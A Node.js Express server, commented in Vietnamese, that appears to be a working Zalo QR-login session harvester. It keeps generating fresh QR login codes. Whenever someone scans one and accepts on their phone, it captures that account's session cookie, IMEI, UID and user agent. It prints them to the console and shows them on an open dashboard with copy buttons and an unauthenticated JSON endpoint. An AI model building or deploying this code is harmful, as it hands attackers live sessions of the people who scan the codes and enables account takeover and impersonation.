const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Zalo } = require('zca-js');

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================
// STATE
// ============================================================
let currentSession = {
    sessionId: null,
    imei: null,
    status: 'INITIALIZING', // INITIALIZING | WAITING_SCAN | SUCCESS | ERROR
    qrPath: path.join(__dirname, 'qr.png'),
    lastError: null,
};

// Lưu toàn bộ phiên đã login thành công: imei + cookie + uid + userAgent
const loggedSessions = [];

// ============================================================
// HELPERS
// ============================================================
function deleteQrFile() {
    if (fs.existsSync(currentSession.qrPath)) {
        try { fs.unlinkSync(currentSession.qrPath); } catch (e) {}
    }
}

function safePreview(obj, depth = 2) {
    const seen = new WeakSet();
    function walk(o, d) {
        if (o === null || typeof o !== 'object') return o;
        if (d <= 0) return '[Object]';
        if (seen.has(o)) return '[Circular]';
        seen.add(o);
        if (Array.isArray(o)) return o.slice(0, 5).map(x => walk(x, d - 1));
        const out = {};
        for (const k of Object.keys(o).slice(0, 30)) {
            try { out[k] = walk(o[k], d - 1); } catch (e) { out[k] = '[err]'; }
        }
        return out;
    }
    try { return walk(obj, depth); } catch (e) { return '[unserializable]'; }
}

// Bắt mọi field có thể chứa session trong object api của zca-js
function extractSession(api) {
    let ctx = null;
    try {
        if (typeof api.getContext === 'function') ctx = api.getContext();
        else if (api.ctx) ctx = api.ctx;
        else if (api.context) ctx = api.context;
        else ctx = api;
    } catch (e) { ctx = api; }

    const imei = ctx?.imei || ctx?.deviceId || ctx?.device?.imei || null;
    const cookie = ctx?.cookie || ctx?.cookies || ctx?.cookieJar || null;
    const uid = ctx?.uid || ctx?.userId || ctx?.ownId || null;
    const userAgent = ctx?.userAgent || ctx?.ua || null;

    let cookieStr = cookie;
    if (cookie && typeof cookie !== 'string') {
        try {
            if (Array.isArray(cookie)) {
                cookieStr = cookie.map(c =>
                    typeof c === 'string' ? c : (c.name ? `${c.name}=${c.value}` : JSON.stringify(c))
                ).join('; ');
            } else {
                cookieStr = JSON.stringify(cookie);
            }
        } catch (e) { cookieStr = String(cookie); }
    }

    return {
        imei,
        cookie: cookieStr,
        uid,
        userAgent,
        raw: {
            ctxKeys: ctx ? Object.keys(ctx) : [],
            ctxPreview: ctx ? safePreview(ctx) : null
        }
    };
}

// ============================================================
// QR LOOP — vòng xoay QR liên tục, mỗi lượt 1 imei mới
// ============================================================
async function loopZaloQR() {
    while (true) {
        deleteQrFile();

        currentSession.sessionId = crypto.randomUUID().slice(0, 8);
        currentSession.imei = crypto.randomUUID();
        currentSession.status = 'INITIALIZING';
        currentSession.lastError = null;

        console.log(`\n========================================`);
        console.log(`[Lượt mới] IMEI: ${currentSession.imei} (Session: ${currentSession.sessionId})`);

        const zalo = new Zalo({
            selfListen: false,
            checkUpdate: false,
            imei: currentSession.imei,
        });

        // Poll file qr.png — zca-js tự ghi ra ./qr.png khi có QR
        const watcher = setInterval(() => {
            if (fs.existsSync(currentSession.qrPath)) {
                if (currentSession.status !== 'WAITING_SCAN') {
                    currentSession.status = 'WAITING_SCAN';
                    console.log(`[QR] sẵn sàng cho session ${currentSession.sessionId}`);
                }
            }
        }, 400);

        try {
            const api = await zalo.loginQR();
            clearInterval(watcher);

            currentSession.status = 'SUCCESS';
            console.log(`🎉 [Thành công] IMEI ${currentSession.imei} đã login`);

            const session = extractSession(api);
            loggedSessions.push({
                sessionId: currentSession.sessionId,
                imei: session.imei || currentSession.imei,
                cookie: session.cookie,
                uid: session.uid,
                userAgent: session.userAgent,
                raw: session.raw,
                loginTime: new Date().toLocaleString('vi-VN'),
                api,
            });

            console.log(`--- SESSION DATA ---`);
            console.log(`IMEI   : ${session.imei}`);
            console.log(`UID    : ${session.uid}`);
            console.log(`COOKIE : ${session.cookie}`);
            console.log(`UA     : ${session.userAgent}`);
            console.log(`--------------------`);

            // QR dùng rồi vứt
            deleteQrFile();

            // Giữ trạng thái SUCCESS 3s để web kịp hiển thị
            await new Promise(r => setTimeout(r, 3000));
        } catch (err) {
            clearInterval(watcher);
            currentSession.status = 'ERROR';
            currentSession.lastError = err.message;
            console.error(`❌ Session ${currentSession.sessionId} lỗi:`, err.message);
            deleteQrFile();
            await new Promise(r => setTimeout(r, 2000));
        }
    }
}

loopZaloQR();

// ============================================================
// QR IMAGE
// ============================================================
app.get('/qr.png', (req, res) => {
    if (currentSession.status === 'WAITING_SCAN' && fs.existsSync(currentSession.qrPath)) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.sendFile(currentSession.qrPath);
    } else {
        res.status(404).send('QR chưa sẵn sàng hoặc đã dùng');
    }
});

// ============================================================
// API STATUS
// ============================================================
app.get('/api/status', (req, res) => {
    res.json({
        sessionId: currentSession.sessionId,
        imei: currentSession.imei,
        status: currentSession.status,
        lastError: currentSession.lastError,
        totalLoggedIn: loggedSessions.length,
    });
});

// ============================================================
// API SESSIONS — trả về danh sách imei + cookie đã login
// ============================================================
app.get('/api/sessions', (req, res) => {
    // Không trả field `api` (object zca-js không serialize được)
    const safe = loggedSessions.map(s => ({
        sessionId: s.sessionId,
        imei: s.imei,
        uid: s.uid,
        cookie: s.cookie,
        userAgent: s.userAgent,
        loginTime: s.loginTime,
        raw: s.raw,
    }));
    res.json({ total: safe.length, sessions: safe });
});

// ============================================================
// DASHBOARD — hiển thị toàn bộ imei + cookie của các máy đã login
// ============================================================
function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    })[c]);
}

app.get('/dashboard', (req, res) => {
    const rows = loggedSessions.map((s, i) => `
        <div class="card">
            <div class="card-head">
                <span class="idx">#${i + 1}</span>
                <span class="time">${escapeHtml(s.loginTime)}</span>
            </div>
            <div class="label">Session ID</div>
            <div class="value">${escapeHtml(s.sessionId)}</div>

            <div class="label">IMEI</div>
            <div class="value" id="imei-${i}">${escapeHtml(s.imei || '(không lấy được)')}</div>

            <div class="label">UID</div>
            <div class="value" id="uid-${i}">${escapeHtml(s.uid || '(không lấy được)')}</div>

            <div class="label">Cookie</div>
            <div class="value" id="cookie-${i}">${escapeHtml(s.cookie || '(không lấy được)')}</div>

            <div class="label">User-Agent</div>
            <div class="value" id="ua-${i}">${escapeHtml(s.userAgent || '(không lấy được)')}</div>

            <div class="row">
                <button onclick="copyText('cookie-${i}', event)">Copy cookie</button>
                <button onclick="copyText('imei-${i}', event)">Copy IMEI</button>
            </div>
        </div>
    `).join('');

    res.send(`
        <!DOCTYPE html>
        <html lang="vi">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Session Info — Zalo</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                       background: #0f1115; color: #e6e6e6; margin: 0; padding: 24px; }
                h1 { color: #28a745; margin-top: 0; }
                .sub { color: #8b93a7; margin-bottom: 24px; }
                .empty { color: #8b93a7; font-style: italic; }
                .card { background: #181b22; border: 1px solid #262a33; border-radius: 10px;
                        padding: 16px 18px; margin-bottom: 16px; }
                .card-head { display: flex; justify-content: space-between;
                             margin-bottom: 12px; padding-bottom: 8px;
                             border-bottom: 1px solid #262a33; }
                .idx { color: #0068ff; font-weight: bold; }
                .time { color: #8b93a7; font-size: 12px; }
                .label { font-size: 12px; text-transform: uppercase; letter-spacing: 1px;
                         color: #8b93a7; margin: 10px 0 6px; }
                .value { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
                         font-size: 13px; word-break: break-all; white-space: pre-wrap;
                         background: #0b0d12; border: 1px solid #232733; border-radius: 6px;
                         padding: 10px 12px; }
                .row { display: flex; gap: 10px; align-items: center; margin-top: 10px; }
                button { background: #0068ff; color: white; border: 0; padding: 8px 14px;
                         border-radius: 6px; cursor: pointer; font-size: 13px; }
                button:hover { background: #0052cc; }
                .top { display: flex; justify-content: space-between; align-items: center; }
                .back { color: #0068ff; text-decoration: none; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="top">
                <h1>🎉 Danh sách session Zalo</h1>
                <a class="back" href="/">← Về trang quét QR</a>
            </div>
            <p class="sub">Tổng cộng: <b>${loggedSessions.length}</b> máy đã đăng nhập</p>

            ${loggedSessions.length === 0
                ? '<p class="empty">Chưa có máy nào đăng nhập. Quay lại trang chủ để quét QR.</p>'
                : rows}

            <script>
                function copyText(id, ev) {
                    const t = document.getElementById(id).innerText;
                    navigator.clipboard.writeText(t).then(() => {
                        const b = ev.target;
                        const old = b.innerText;
                        b.innerText = 'Đã copy!';
                        setTimeout(() => b.innerText = old, 1200);
                    });
                }
                // Auto-refresh mỗi 5s để cập nhật session mới
                setInterval(() => location.reload(), 5000);
            </script>
        </body>
        </html>
    `);
});

// ============================================================
// TRANG CHỦ — QR xoay liên tục (giữ nguyên cơ chế gốc)
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="vi">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Quét mã Zalo liên tục</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                       display: flex; justify-content: center; align-items: center;
                       min-height: 100vh; margin: 0; background: #f0f2f5; }
                .box { background: white; padding: 30px; border-radius: 12px;
                       box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 340px; }
                h2 { margin: 0; color: #0068ff; }
                .badge { display: inline-block; background: #e8f4fd; color: #0068ff;
                         font-size: 13px; font-weight: bold; padding: 4px 12px;
                         border-radius: 20px; margin-top: 10px; }
                .badge a { color: #0068ff; text-decoration: none; }
                .qr-box { width: 260px; height: 260px; margin: 20px auto;
                          display: flex; align-items: center; justify-content: center;
                          border: 1px dashed #ccc; border-radius: 8px; background: #fafafa; }
                img { width: 100%; height: 100%; border-radius: 8px; object-fit: contain; }
                #status { font-weight: bold; color: #555; font-size: 14px; min-height: 40px; }
                #err { color: #d9534f; font-size: 12px; min-height: 16px; margin-top: 6px; }
            </style>
        </head>
        <body>
            <div class="box">
                <h2>Zalo Login</h2>
                <div class="badge" id="countBadge">
                    Đã quét: <b>0</b> máy — <a href="/dashboard">xem</a>
                </div>

                <div class="qr-box" id="qrArea">
                    <p>Đang chuẩn bị mã QR...</p>
                </div>

                <div id="status">Vui lòng chờ hệ thống nạp mã...</div>
                <div id="err"></div>
            </div>

            <script>
                let lastSessionId = null;

                setInterval(async () => {
                    try {
                        const res = await fetch('/api/status');
                        const data = await res.json();

                        document.getElementById('countBadge').innerHTML =
                            'Đã quét: <b>' + data.totalLoggedIn + '</b> máy — <a href="/dashboard">xem</a>';
                        document.getElementById('err').innerText = data.lastError || '';

                        if (data.status === 'INITIALIZING') {
                            document.getElementById('status').innerText = 'Đang tạo mã cho thiết bị mới...';
                            document.getElementById('status').style.color = '#555';
                            document.getElementById('qrArea').innerHTML = '<p>Đang khởi tạo mã mới...</p>';
                            lastSessionId = null;
                        }
                        else if (data.status === 'WAITING_SCAN') {
                            if (lastSessionId !== data.sessionId) {
                                lastSessionId = data.sessionId;
                                document.getElementById('qrArea').innerHTML =
                                    '<img src="/qr.png?s=' + data.sessionId + '&t=' + Date.now() + '" alt="QR">';
                                document.getElementById('status').innerText =
                                    'Mở Zalo quét mã và bấm Chấp nhận trên điện thoại';
                                document.getElementById('status').style.color = '#0068ff';
                            }
                        }
                        else if (data.status === 'SUCCESS') {
                            document.getElementById('qrArea').innerHTML =
                                '<p style="color:#28a745; font-weight:bold; font-size:18px;">✔ Đã nhận diện!<br>Mã này đã bị hủy.</p>';
                            document.getElementById('status').innerText =
                                'Thành công! Đang sinh mã tiếp theo...';
                            document.getElementById('status').style.color = '#28a745';
                            lastSessionId = null;
                        }
                        else if (data.status === 'ERROR') {
                            document.getElementById('status').innerText = 'Lỗi phiên, đang thử lại...';
                            document.getElementById('status').style.color = '#d9534f';
                            lastSessionId = null;
                        }
                    } catch (e) {}
                }, 1200);
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log("Server đang chạy tại http://localhost:" + PORT);
});
